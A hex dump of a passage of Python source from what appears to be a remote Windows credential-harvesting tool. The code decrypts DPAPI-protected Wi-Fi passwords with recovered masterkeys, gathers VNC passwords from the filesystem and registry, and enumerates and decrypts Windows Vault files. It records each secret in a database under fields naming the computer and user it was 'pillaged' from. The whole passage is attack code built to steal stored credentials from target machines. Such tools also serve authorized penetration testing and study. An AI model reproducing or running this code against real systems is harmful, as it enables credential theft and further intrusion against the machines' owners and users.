+0000b390: 6172 6765 745f 6970 7d5d 204c 6f6f 6b69  arget_ip}] Looki
+0000b3a0: 6e67 2066 6f72 207b 6c6f 6e67 6e61 6d65  ng for {longname
+0000b3b0: 327d 206d 6173 7465 726b 6579 203a 207b  2} masterkey : {
+0000b3c0: 6775 6964 7d22 290a 0909 0909 0909 0909  guid}").........
+0000b3d0: 0969 6620 6775 6964 2021 3d20 4e6f 6e65  .if guid != None
+0000b3e0: 3a0a 0909 0909 0909 0909 0909 6d61 7374  :...........mast
+0000b3f0: 6572 6b65 7920 3d20 7365 6c66 2e67 6574  erkey = self.get
+0000b400: 5f6d 6173 7465 726b 6579 2875 7365 723d  _masterkey(user=
+0000b410: 7573 6572 2c20 6775 6964 3d67 7569 642c  user, guid=guid,
+0000b420: 2074 7970 653d 274d 4143 4849 4e45 2729   type='MACHINE')
+0000b430: 0a09 0909 0909 0909 0909 0969 6620 6d61  ...........if ma
+0000b440: 7374 6572 6b65 7920 213d 204e 6f6e 653a  sterkey != None:
+0000b450: 0a09 0909 0909 0909 0909 0909 6966 206d  ............if m
+0000b460: 6173 7465 726b 6579 5b27 7374 6174 7573  asterkey['status
+0000b470: 275d 203d 3d20 2764 6563 7279 7074 6564  '] == 'decrypted
+0000b480: 273a 0a09 0909 0909 0909 0909 0909 096d  ':.............m
+0000b490: 7964 7061 7069 2e6f 7074 696f 6e73 2e6b  ydpapi.options.k
+0000b4a0: 6579 203d 206d 6173 7465 726b 6579 5b27  ey = masterkey['
+0000b4b0: 6b65 7927 5d0a 0909 0909 0909 0909 0909  key']...........
+0000b4c0: 0909 2320 6372 6564 5f64 6174 6120 3d20  ..# cred_data = 
+0000b4d0: 6d79 6470 6170 692e 6465 6372 7970 745f  mydpapi.decrypt_
+0000b4e0: 6372 6564 656e 7469 616c 2829 0a09 0909  credential()....
+0000b4f0: 0909 0909 0909 0909 0963 7265 645f 6461  .........cred_da
+0000b500: 7461 203d 206d 7964 7061 7069 2e64 6563  ta = mydpapi.dec
+0000b510: 7279 7074 5f62 6c6f 6228 0a09 0909 0909  rypt_blob(......
+0000b520: 0909 0909 0909 0909 7261 775f 6461 7461  ........raw_data
+0000b530: 3d62 696e 6173 6369 692e 756e 6865 786c  =binascii.unhexl
+0000b540: 6966 7928 6b65 795f 6d61 7465 7269 616c  ify(key_material
+0000b550: 2929 0a09 0909 0909 0909 0909 0909 0969  )).............i
+0000b560: 6620 6372 6564 5f64 6174 6120 213d 204e  f cred_data != N
+0000b570: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
+0000b580: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
+0000b590: 676e 616d 6532 5d5b 2773 7461 7475 7327  gname2]['status'
+0000b5a0: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
+0000b5b0: 0909 0909 0909 0909 0909 0909 0975 7365  .............use
+0000b5c0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000b5d0: 325d 5b27 6461 7461 275d 203d 2063 7265  2]['data'] = cre
+0000b5e0: 645f 6461 7461 0a09 0909 0909 0909 0909  d_data..........
+0000b5f0: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
+0000b600: 6f6e 676e 616d 6532 5d5b 2773 6563 7265  ongname2]['secre
+0000b610: 7427 5d20 3d20 6372 6564 5f64 6174 610a  t'] = cred_data.
+0000b620: 0909 0909 0909 0909 0909 0909 0973 656c  .............sel
+0000b630: 662e 6c6f 6767 696e 672e 696e 666f 280a  f.logging.info(.
+0000b640: 0909 0909 0909 0909 0909 0909 0909 6622  ..............f"
+0000b650: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+0000b660: 6172 6765 745f 6970 7d5d 205b 2b5d 207b  arget_ip}] [+] {
+0000b670: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
+0000b680: 2057 6966 6920 7b62 636f 6c6f 7273 2e4f   Wifi {bcolors.O
+0000b690: 4b42 4c55 457d 7b77 6966 695f 6e61 6d65  KBLUE}{wifi_name
+0000b6a0: 7d20 7b62 636f 6c6f 7273 2e4f 4b47 5245  } {bcolors.OKGRE
+0000b6b0: 454e 7d20 2d20 7b63 7265 645f 6461 7461  EN} - {cred_data
+0000b6c0: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d22  }{bcolors.ENDC}"
+0000b6d0: 290a 0909 0909 0909 0909 0909 0909 0923  )..............#
+0000b6e0: 2323 2323 2323 2323 2323 2350 524f 4345  ###########PROCE
+0000b6f0: 5353 494e 4720 4441 5441 0a09 0909 0909  SSING DATA......
+0000b700: 0909 0909 0909 0909 7365 6c66 2e64 622e  ........self.db.
+0000b710: 6164 645f 6372 6564 7a28 6372 6564 7a5f  add_credz(credz_
+0000b720: 7479 7065 3d27 7769 6669 272c 0a09 0909  type='wifi',....
+0000b730: 0909 0909 0909 0909 0909 0909 0909 2020  ..............  
+0000b740: 6372 6564 7a5f 7573 6572 6e61 6d65 3d77  credz_username=w
+0000b750: 6966 695f 6e61 6d65 2e64 6563 6f64 6528  ifi_name.decode(
+0000b760: 2775 7466 2d38 2729 2c0a 0909 0909 0909  'utf-8'),.......
+0000b770: 0909 0909 0909 0909 0909 0920 2063 7265  ...........  cre
+0000b780: 647a 5f70 6173 7377 6f72 643d 6372 6564  dz_password=cred
+0000b790: 5f64 6174 612e 6465 636f 6465 2827 7574  _data.decode('ut
+0000b7a0: 662d 3827 292c 0a09 0909 0909 0909 0909  f-8'),..........
+0000b7b0: 0909 0909 0909 0909 2020 6372 6564 7a5f  ........  credz_
+0000b7c0: 7461 7267 6574 3d77 6966 695f 6e61 6d65  target=wifi_name
+0000b7d0: 2e64 6563 6f64 6528 2775 7466 2d38 2729  .decode('utf-8')
+0000b7e0: 2c0a 0909 0909 0909 0909 0909 0909 0909  ,...............
+0000b7f0: 0909 0920 2063 7265 647a 5f70 6174 683d  ...  credz_path=
+0000b800: 7573 6572 2e66 696c 6573 5b6c 6f6e 676e  user.files[longn
+0000b810: 616d 6532 5d5b 2770 6174 6827 5d2c 0a09  ame2]['path'],..
+0000b820: 0909 0909 0909 0909 0909 0909 0909 0909  ................
+0000b830: 2020 7069 6c6c 6167 6564 5f66 726f 6d5f    pillaged_from_
+0000b840: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
+0000b850: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000b860: 6970 2c0a 0909 0909 0909 0909 0909 0909  ip,.............
+0000b870: 0909 0909 0920 2070 696c 6c61 6765 645f  .....  pillaged_
+0000b880: 6672 6f6d 5f75 7365 726e 616d 653d 7573  from_username=us
+0000b890: 6572 2e75 7365 726e 616d 6529 0a09 0909  er.username)....
+0000b8a0: 0909 0909 0909 0909 2320 7365 6d66 2e70  ........# semf.p
+0000b8b0: 726f 6365 7373 5f64 6563 7279 7074 6564  rocess_decrypted
+0000b8c0: 5f64 6174 6128 7573 6572 2e66 696c 6573  _data(user.files
+0000b8d0: 5b6c 6f6e 676e 616d 6532 5d29 2363 7265  [longname2])#cre
+0000b8e0: 645f 6461 7461 2c20 7573 6572 2c20 6c6f  d_data, user, lo
+0000b8f0: 6361 6c66 696c 652c 2074 7970 653d 2777  calfile, type='w
+0000b900: 6966 6927 2c20 6172 6773 3d5b 7769 6669  ifi', args=[wifi
+0000b910: 5f6e 616d 655d 290a 0909 0909 0909 0909  _name]).........
+0000b920: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
+0000b930: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+0000b940: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+0000b950: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000b960: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000b970: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+0000b980: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
+0000b990: 7469 6e67 2057 4946 4920 426c 6f62 2066  ting WIFI Blob f
+0000b9a0: 6f72 207b 6c6f 6361 6c66 696c 657d 2077  or {localfile} w
+0000b9b0: 6974 6820 4d61 7374 6572 6b65 7920 2d20  ith Masterkey - 
+0000b9c0: 4d61 7374 6572 6b65 7920 6e6f 7420 6465  Masterkey not de
+0000b9d0: 6372 7970 7465 647b 6263 6f6c 6f72 732e  crypted{bcolors.
+0000b9e0: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
+0000b9f0: 0909 656c 7365 3a0a 0909 0909 0909 0909  ..else:.........
+0000ba00: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+0000ba10: 6465 6275 6728 0a09 0909 0909 0909 0909  debug(..........
+0000ba20: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
+0000ba30: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+0000ba40: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
+0000ba50: 7d45 7272 6f72 2064 6563 7279 7074 696e  }Error decryptin
+0000ba60: 6720 5749 4649 2042 6c6f 6220 666f 7220  g WIFI Blob for 
+0000ba70: 7b6c 6f63 616c 6669 6c65 7d20 7769 7468  {localfile} with
+0000ba80: 204d 6173 7465 726b 6579 2d20 6361 6e74   Masterkey- cant
+0000ba90: 2067 6574 206d 6173 7465 726b 6579 207b   get masterkey {
+0000baa0: 6775 6964 7d7b 6263 6f6c 6f72 732e 454e  guid}{bcolors.EN
+0000bab0: 4443 7d22 290a 0909 0909 0909 0909 0965  DC}")..........e
+0000bac0: 6c73 653a 0a09 0909 0909 0909 0909 0973  lse:...........s
+0000bad0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000bae0: 6728 0a09 0909 0909 0909 0909 0909 6622  g(............f"
+0000baf0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+0000bb00: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
+0000bb10: 6f72 732e 5741 524e 494e 477d 4572 726f  ors.WARNING}Erro
+0000bb20: 7220 6465 6372 7970 7469 6e67 2057 4946  r decrypting WIF
+0000bb30: 4942 6c6f 6220 666f 7220 7b6c 6f63 616c  IBlob for {local
+0000bb40: 6669 6c65 7d20 7769 7468 204d 6173 7465  file} with Maste
+0000bb50: 726b 6579 202d 2063 616e 2074 2067 6574  rkey - can t get
+0000bb60: 2074 6865 2047 5549 4420 6f66 206d 6173   the GUID of mas
+0000bb70: 7465 726b 6579 2066 726f 6d20 626c 6f62  terkey from blob
+0000bb80: 2066 696c 657b 6263 6f6c 6f72 732e 454e   file{bcolors.EN
+0000bb90: 4443 7d22 290a 0909 0909 0909 0909 6578  DC}").........ex
+0000bba0: 6365 7074 2045 7863 6570 7469 6f6e 2061  cept Exception a
+0000bbb0: 7320 6578 3a0a 0909 0909 0909 0909 0973  s ex:..........s
+0000bbc0: 656c 662e 6c6f 6767 696e 672e 6572 726f  elf.logging.erro
+0000bbd0: 7228 0a09 0909 0909 0909 0909 0966 227b  r(...........f"{
+0000bbe0: 6263 6f6c 6f72 732e 5741 524e 494e 477d  bcolors.WARNING}
+0000bbf0: 4578 6365 7074 696f 6e20 6465 6372 7970  Exception decryp
+0000bc00: 7469 6e67 2077 6966 6920 6372 6564 656e  ting wifi creden
+0000bc10: 7469 616c 737b 6263 6f6c 6f72 732e 454e  tials{bcolors.EN
+0000bc20: 4443 7d22 290a 0909 0909 0909 0909 0973  DC}")..........s
+0000bc30: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000bc40: 6728 6578 290a 0909 7265 7475 726e 2031  g(ex)...return 1
+0000bc50: 0a0a 0964 6566 2047 6574 564e 4328 7365  ...def GetVNC(se
+0000bc60: 6c66 293a 0a09 0974 7279 3a0a 0909 0973  lf):...try:....s
+0000bc70: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
+0000bc80: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
+0000bc90: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+0000bca0: 636f 6c6f 7273 2e4f 4b42 4c55 457d 5b2b  colors.OKBLUE}[+
+0000bcb0: 5d20 4761 7468 6572 696e 6720 564e 4320  ] Gathering VNC 
+0000bcc0: 5061 7373 776f 7264 737b 6263 6f6c 6f72  Passwords{bcolor
+0000bcd0: 732e 454e 4443 7d22 290a 0909 096d 7976  s.ENDC}")....myv
+0000bce0: 6e63 203d 2056 6e63 2873 656c 662e 6d79  nc = Vnc(self.my
+0000bcf0: 7265 676f 7073 2c20 7365 6c66 2e6d 7966  regops, self.myf
+0000bd00: 696c 656f 7073 2c20 7365 6c66 2e6c 6f67  ileops, self.log
+0000bd10: 6769 6e67 2c20 7365 6c66 2e6f 7074 696f  ging, self.optio
+0000bd20: 6e73 2c20 7365 6c66 2e64 6229 0a09 0909  ns, self.db)....
+0000bd30: 6d79 766e 632e 766e 635f 6672 6f6d 5f66  myvnc.vnc_from_f
+0000bd40: 696c 6573 7973 7465 6d28 290a 0909 096d  ilesystem()....m
+0000bd50: 7976 6e63 2e76 6e63 5f66 726f 6d5f 7265  yvnc.vnc_from_re
+0000bd60: 6769 7374 7279 2829 0a09 0965 7863 6570  gistry()...excep
+0000bd70: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+0000bd80: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
+0000bd90: 6e67 2e65 7272 6f72 2866 227b 6263 6f6c  ng.error(f"{bcol
+0000bda0: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
+0000bdb0: 7074 696f 6e20 494e 2056 4e43 2047 4154  ption IN VNC GAT
+0000bdc0: 4845 5249 4e47 7b62 636f 6c6f 7273 2e45  HERING{bcolors.E
+0000bdd0: 4e44 437d 2229 0a09 0909 7365 6c66 2e6c  NDC}")....self.l
+0000bde0: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
+0000bdf0: 0a0a 0964 6566 2047 6574 5661 756c 7473  ...def GetVaults
+0000be00: 2873 656c 6629 3a0a 0909 7365 6c66 2e6c  (self):...self.l
+0000be10: 6f67 6769 6e67 2e69 6e66 6f28 6622 5b7b  ogging.info(f"[{
+0000be20: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+0000be30: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+0000be40: 732e 4f4b 424c 5545 7d5b 2b5d 2047 6174  s.OKBLUE}[+] Gat
+0000be50: 6865 7269 6e67 2056 6175 6c74 737b 6263  hering Vaults{bc
+0000be60: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+0000be70: 626c 6163 6b6c 6973 7420 3d20 5b27 2e27  blacklist = ['.'
+0000be80: 2c20 272e 2e27 2c20 2755 7365 7250 726f  , '..', 'UserPro
+0000be90: 6669 6c65 526f 616d 696e 6727 5d0a 0909  fileRoaming']...
+0000bea0: 2320 6372 6564 656e 7469 616c 7320 3f0a  # credentials ?.
+0000beb0: 0909 2320 5661 756c 7473 203f 0a09 0923  ..# Vaults ?...#
+0000bec0: 2050 6172 7365 2063 6872 6f6d 650a 0909   Parse chrome...
+0000bed0: 2320 6175 7472 6573 206e 6176 6967 6174  # autres navigat
+0000bee0: 6575 7273 203f 0a09 0923 2043 7265 6448  eurs ?...# CredH
+0000bef0: 6973 746f 7279 0a0a 0909 7573 6572 5f64  istory....user_d
+0000bf00: 6972 6563 746f 7269 6573 203d 205b 2822  irectories = [("
+0000bf10: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
+0000bf20: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
+0000bf30: 6c5c 5c4d 6963 726f 736f 6674 5c5c 5661  l\\Microsoft\\Va
+0000bf40: 756c 7422 2c20 272a 272c 2027 7661 756c  ult", '*', 'vaul
+0000bf50: 7427 2c20 2744 4f4d 4149 4e27 295d 0a09  t', 'DOMAIN')]..
+0000bf60: 096d 6163 6869 6e65 5f64 6972 6563 746f  .machine_directo
+0000bf70: 7269 6573 203d 205b 2822 5072 6f67 7261  ries = [("Progra
+0000bf80: 6d44 6174 615c 5c4d 6963 726f 736f 6674  mData\\Microsoft
+0000bf90: 5c5c 5661 756c 7422 2c20 272a 272c 2027  \\Vault", '*', '
+0000bfa0: 7661 756c 7427 2c20 274d 4143 4849 4e45  vault', 'MACHINE
+0000bfb0: 2729 2c0a 0909 0909 0909 0920 2020 2822  '),........   ("
+0000bfc0: 5769 6e64 6f77 735c 5c73 7973 7465 6d33  Windows\\system3
+0000bfd0: 325c 5c63 6f6e 6669 675c 5c73 7973 7465  2\\config\\syste
+0000bfe0: 6d70 726f 6669 6c65 5c5c 4170 7044 6174  mprofile\\AppDat
+0000bff0: 615c 5c4c 6f63 616c 5c5c 4d69 6372 6f73  a\\Local\\Micros
+0000c000: 6f66 745c 5c56 6175 6c74 5c5c 222c 2027  oft\\Vault\\", '
+0000c010: 2a27 2c0a 0909 0909 0909 0909 2776 6175  *',.........'vau
+0000c020: 6c74 272c 2027 4d41 4348 494e 4527 295d  lt', 'MACHINE')]
+0000c030: 2020 2320 5769 6e64 6f77 7320 6865 6c6c    # Windows hell
+0000c040: 6f20 7069 6e63 6f64 650a 0a09 0966 6f72  o pincode....for
+0000c050: 2075 7365 7220 696e 2073 656c 662e 7573   user in self.us
+0000c060: 6572 733a 0a09 0909 6966 2075 7365 722e  ers:....if user.
+0000c070: 7573 6572 6e61 6d65 203d 3d20 274d 4143  username == 'MAC
+0000c080: 4849 4e45 2427 3a0a 0909 0909 6469 7265  HINE$':.....dire
+0000c090: 6374 6f72 6965 735f 746f 5f75 7365 203d  ctories_to_use =
+0000c0a0: 206d 6163 6869 6e65 5f64 6972 6563 746f   machine_directo
+0000c0b0: 7269 6573 0a09 0909 656c 7365 3a0a 0909  ries....else:...
+0000c0c0: 0909 6469 7265 6374 6f72 6965 735f 746f  ..directories_to
+0000c0d0: 5f75 7365 203d 2075 7365 725f 6469 7265  _use = user_dire
+0000c0e0: 6374 6f72 6965 730a 0a09 0909 6966 206c  ctories.....if l
+0000c0f0: 656e 2875 7365 722e 6d61 7374 6572 6b65  en(user.masterke
+0000c100: 7973 5f66 696c 6529 203e 2030 3a20 2023  ys_file) > 0:  #
+0000c110: 2050 6173 2064 6520 6d61 7374 6572 6b65   Pas de masterke
+0000c120: 7973 3d3d 7061 7320 6465 2064 6174 6173  ys==pas de datas
+0000c130: 2061 2072 6563 7570 0a09 0909 0966 6f72   a recup.....for
+0000c140: 2069 6e66 6f20 696e 2064 6972 6563 746f   info in directo
+0000c150: 7269 6573 5f74 6f5f 7573 653a 0a09 0909  ries_to_use:....
+0000c160: 0909 6d79 5f64 6972 2c20 6d79 5f6d 6173  ..my_dir, my_mas
+0000c170: 6b2c 206d 795f 626c 6f62 5f74 7970 652c  k, my_blob_type,
+0000c180: 206d 795f 7573 6572 5f74 7970 6520 3d20   my_user_type = 
+0000c190: 696e 666f 0a09 0909 0909 746d 705f 7077  info......tmp_pw
+0000c1a0: 6420 3d20 6d79 5f64 6972 2e66 6f72 6d61  d = my_dir.forma
+0000c1b0: 7428 0a09 0909 0909 0975 7365 726e 616d  t(.......usernam
+0000c1c0: 653d 7573 6572 2e75 7365 726e 616d 6529  e=user.username)
+0000c1d0: 2020 2320 6622 5573 6572 735c 5c7b 7573    # f"Users\\{us
+0000c1e0: 6572 2e75 7365 726e 616d 657d 5c5c 7b6d  er.username}\\{m
+0000c1f0: 795f 6469 727d 2223 6e74 7061 7468 2e6a  y_dir}"#ntpath.j
+0000c200: 6f69 6e28 6e74 7061 7468 2e6a 6f69 6e28  oin(ntpath.join(
+0000c210: 2755 7365 7273 272c 2075 7365 722e 7573  'Users', user.us
+0000c220: 6572 6e61 6d65 292c 206d 795f 6469 7229  ername), my_dir)
+0000c230: 0a09 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+0000c240: 6e67 2e64 6562 7567 2822 4c6f 6f6b 696e  ng.debug("Lookin
+0000c250: 6720 666f 7220 2573 2056 6175 6c74 7320  g for %s Vaults 
+0000c260: 696e 2025 7320 7769 7468 206d 6173 6b20  in %s with mask 
+0000c270: 2573 2220 2520 2875 7365 722e 7573 6572  %s" % (user.user
+0000c280: 6e61 6d65 2c20 746d 705f 7077 642c 206d  name, tmp_pwd, m
+0000c290: 795f 6d61 736b 2929 0a09 0909 0909 6d79  y_mask))......my
+0000c2a0: 5f64 6972 6563 746f 7279 203d 2073 656c  _directory = sel
+0000c2b0: 662e 6d79 6669 6c65 6f70 732e 646f 5f6c  f.myfileops.do_l
+0000c2c0: 7328 746d 705f 7077 642c 206d 795f 6d61  s(tmp_pwd, my_ma
+0000c2d0: 736b 2c20 6469 7370 6c61 793d 4661 6c73  sk, display=Fals
+0000c2e0: 6529 0a09 0909 0909 666f 7220 696e 666f  e)......for info
+0000c2f0: 7320 696e 206d 795f 6469 7265 6374 6f72  s in my_director
+0000c300: 793a 0a09 0909 0909 096c 6f6e 676e 616d  y:.......longnam
+0000c310: 652c 2069 735f 6469 7265 6374 6f72 7920  e, is_directory 
+0000c320: 3d20 696e 666f 730a 0909 0909 0909 7365  = infos.......se
+0000c330: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+0000c340: 2822 6c73 2072 6574 7572 6e65 6420 2573  ("ls returned %s
+0000c350: 2220 2520 6c6f 6e67 6e61 6d65 290a 0909  " % longname)...
+0000c360: 0909 0909 6966 206c 6f6e 676e 616d 6520  ....if longname 
+0000c370: 6e6f 7420 696e 2062 6c61 636b 6c69 7374  not in blacklist
+0000c380: 2061 6e64 2069 735f 6469 7265 6374 6f72   and is_director
+0000c390: 793a 0a09 0909 0909 0909 7365 6c66 2e6c  y:........self.l
+0000c3a0: 6f67 6769 6e67 2e64 6562 7567 2822 476f  ogging.debug("Go
+0000c3b0: 7420 5661 756c 7420 4469 7265 6374 6f72  t Vault Director
+0000c3c0: 7920 2573 2220 2520 6c6f 6e67 6e61 6d65  y %s" % longname
+0000c3d0: 290a 0909 0909 0909 0974 6d70 5f70 7764  )........tmp_pwd
+0000c3e0: 3220 3d20 6e74 7061 7468 2e6a 6f69 6e28  2 = ntpath.join(
+0000c3f0: 746d 705f 7077 642c 206c 6f6e 676e 616d  tmp_pwd, longnam
+0000c400: 6529 0a09 0909 0909 0909 7472 793a 0a09  e)........try:..
+0000c410: 0909 0909 0909 0923 2046 6972 7374 2067  .......# First g
+0000c420: 6574 2074 6865 2050 6f6c 6963 792e 7670  et the Policy.vp
+0000c430: 6f6c 0a09 0909 0909 0909 096c 6f63 616c  ol.........local
+0000c440: 5f76 706f 6c5f 6669 6c65 203d 2073 656c  _vpol_file = sel
+0000c450: 662e 6d79 6669 6c65 6f70 732e 6765 745f  f.myfileops.get_
+0000c460: 6669 6c65 286e 7470 6174 682e 6a6f 696e  file(ntpath.join
+0000c470: 2874 6d70 5f70 7764 322c 2022 506f 6c69  (tmp_pwd2, "Poli
+0000c480: 6379 2e76 706f 6c22 2929 0a09 0909 0909  cy.vpol"))......
+0000c490: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+0000c4a0: 6e67 6e61 6d65 5d20 3d20 7b7d 0a09 0909  ngname] = {}....
+0000c4b0: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
+0000c4c0: 6c6f 6e67 6e61 6d65 5d5b 2774 7970 6527  longname]['type'
+0000c4d0: 5d20 3d20 6d79 5f62 6c6f 625f 7479 7065  ] = my_blob_type
+0000c4e0: 0a09 0909 0909 0909 0975 7365 722e 6669  .........user.fi
+0000c4f0: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2773  les[longname]['s
+0000c500: 7461 7475 7327 5d20 3d20 2765 6e63 7279  tatus'] = 'encry
+0000c510: 7074 6564 270a 0909 0909 0909 0909 7573  pted'.........us
+0000c520: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
+0000c530: 655d 5b27 5549 4427 5d20 3d20 6c6f 6e67  e]['UID'] = long
+0000c540: 6e61 6d65 0a09 0909 0909 0909 0975 7365  name.........use
+0000c550: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000c560: 5d5b 2770 6174 6827 5d20 3d20 746d 705f  ]['path'] = tmp_
+0000c570: 7077 6432 0a09 0909 0909 0909 0975 7365  pwd2.........use
+0000c580: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000c590: 5d5b 2776 706f 6c5f 7061 7468 275d 203d  ]['vpol_path'] =
+0000c5a0: 206c 6f63 616c 5f76 706f 6c5f 6669 6c65   local_vpol_file
+0000c5b0: 0a09 0909 0909 0909 0975 7365 722e 6669  .........user.fi
+0000c5c0: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2776  les[longname]['v
+0000c5d0: 706f 6c5f 7374 6174 7573 275d 203d 2027  pol_status'] = '
+0000c5e0: 656e 6372 7970 7465 6427 0a09 0909 0909  encrypted'......
+0000c5f0: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+0000c600: 6e67 6e61 6d65 5d5b 2776 7363 6827 5d20  ngname]['vsch'] 
+0000c610: 3d20 7b7d 0a09 0909 0909 0909 0975 7365  = {}.........use
+0000c620: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
+0000c630: 5d5b 2776 6372 6427 5d20 3d20 7b7d 0a09  ]['vcrd'] = {}..
+0000c640: 0909 0909 0909 0975 7365 722e 6669 6c65  .......user.file
+0000c650: 735b 6c6f 6e67 6e61 6d65 5d5b 2764 6174  s[longname]['dat
+0000c660: 6127 5d20 3d20 2727 0a09 0909 0909 0909  a'] = ''........
+0000c670: 0923 2044 6563 7279 7074 2074 6865 206b  .# Decrypt the k
+0000c680: 6579 730a 0a09 0909 0909 0909 096d 796f  eys..........myo
+0000c690: 7074 696f 6e73 203d 2063 6f70 792e 6465  ptions = copy.de
+0000c6a0: 6570 636f 7079 2873 656c 662e 6f70 7469  epcopy(self.opti
+0000c6b0: 6f6e 7329 0a09 0909 0909 0909 096d 796f  ons).........myo
+0000c6c0: 7074 696f 6e73 2e76 6372 6420 3d20 4e6f  ptions.vcrd = No
+0000c6d0: 6e65 2020 2320 5661 756c 7420 4669 6c65  ne  # Vault File
+0000c6e0: 2074 6f20 7061 7273 650a 0909 0909 0909   to parse.......
+0000c6f0: 0909 6d79 6f70 7469 6f6e 732e 6d61 7374  ..myoptions.mast
+0000c700: 6572 6b65 7973 203d 204e 6f6e 650a 0909  erkeys = None...
+0000c710: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
+0000c720: 7670 6f6c 203d 206c 6f63 616c 5f76 706f  vpol = local_vpo
+0000c730: 6c5f 6669 6c65 0a09 0909 0909 0909 096d  l_file.........m
+0000c740: 796f 7074 696f 6e73 2e6b 6579 203d 204e  yoptions.key = N
+0000c750: 6f6e 650a 0909 0909 0909 0909 6d79 6470  one.........mydp
+0000c760: 6170 6920 3d20 4450 4150 4928 6d79 6f70  api = DPAPI(myop
+0000c770: 7469 6f6e 732c 2073 656c 662e 6c6f 6767  tions, self.logg
+0000c780: 696e 6729 0a09 0909 0909 0909 0967 7569  ing).........gui
+0000c790: 6420 3d20 6d79 6470 6170 692e 6669 6e64  d = mydpapi.find
+0000c7a0: 5f56 6175 6c74 5f4d 6173 7465 726b 6579  _Vault_Masterkey
+0000c7b0: 2829 0a09 0909 0909 0909 0969 6620 6775  ().........if gu
+0000c7c0: 6964 2021 3d20 4e6f 6e65 3a0a 0909 0909  id != None:.....
+0000c7d0: 0909 0909 096d 6173 7465 726b 6579 203d  .....masterkey =
+0000c7e0: 2073 656c 662e 6765 745f 6d61 7374 6572   self.get_master
+0000c7f0: 6b65 7928 7573 6572 3d75 7365 722c 2067  key(user=user, g
+0000c800: 7569 643d 6775 6964 2c20 7479 7065 3d6d  uid=guid, type=m
+0000c810: 795f 7573 6572 5f74 7970 6529 0a09 0909  y_user_type)....
+0000c820: 0909 0909 0909 6966 206d 6173 7465 726b  ......if masterk
+0000c830: 6579 2021 3d20 4e6f 6e65 3a0a 0909 0909  ey != None:.....
+0000c840: 0909 0909 0909 6966 206d 6173 7465 726b  ......if masterk
+0000c850: 6579 5b27 7374 6174 7573 275d 203d 3d20  ey['status'] == 
+0000c860: 2764 6563 7279 7074 6564 273a 0a09 0909  'decrypted':....
+0000c870: 0909 0909 0909 0909 6d79 6470 6170 692e  ........mydpapi.
+0000c880: 6f70 7469 6f6e 732e 6b65 7920 3d20 6d61  options.key = ma
+0000c890: 7374 6572 6b65 795b 276b 6579 275d 0a09  sterkey['key']..
+0000c8a0: 0909 0909 0909 0909 0909 6b65 7973 203d  ..........keys =
+0000c8b0: 206d 7964 7061 7069 2e64 6563 7279 7074   mydpapi.decrypt
+0000c8c0: 5f76 6175 6c74 2829 0a09 0909 0909 0909  _vault()........
+0000c8d0: 0909 0909 6966 206b 6579 7320 213d 204e  ....if keys != N
+0000c8e0: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
+0000c8f0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0000c900: 6275 6728 0a09 0909 0909 0909 0909 0909  bug(............
+0000c910: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
